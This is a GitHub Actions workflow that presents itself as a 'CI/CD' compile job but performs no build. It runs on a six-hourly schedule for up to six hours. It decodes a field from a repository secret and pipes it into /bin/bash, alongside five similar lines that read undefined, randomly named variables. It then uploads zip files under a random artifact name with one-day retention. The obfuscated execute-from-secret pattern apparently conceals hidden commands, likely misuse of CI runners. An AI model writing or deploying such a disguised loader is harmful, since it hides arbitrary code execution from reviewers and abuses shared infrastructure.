name: CI/CD
on:
  workflow_dispatch:

  schedule:
    - cron: '32 4,10,16,22 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  compile:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Setup and run
        env:
          f50: ${{ secrets.f50 }}
        run: |
          printf '%s' "$f50" | jq -r .nfok09 | /bin/bash
          printf '%s' "$gs27038" | jq -r .isnyz99155 | /bin/bash
          echo $wypx577 | jq -r .ne6466 | /bin/bash
          echo $rmkgl33 | jq -r .rem5419 | /bin/bash
          printf '%s' "$ej56049" | jq -r .mq9 | /bin/bash
          echo $t1055 | jq -r .zopc57 | /bin/bash

      - name: Upload data
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: kfWWV6vV
          path: "*.zip"
          retention-days: 1
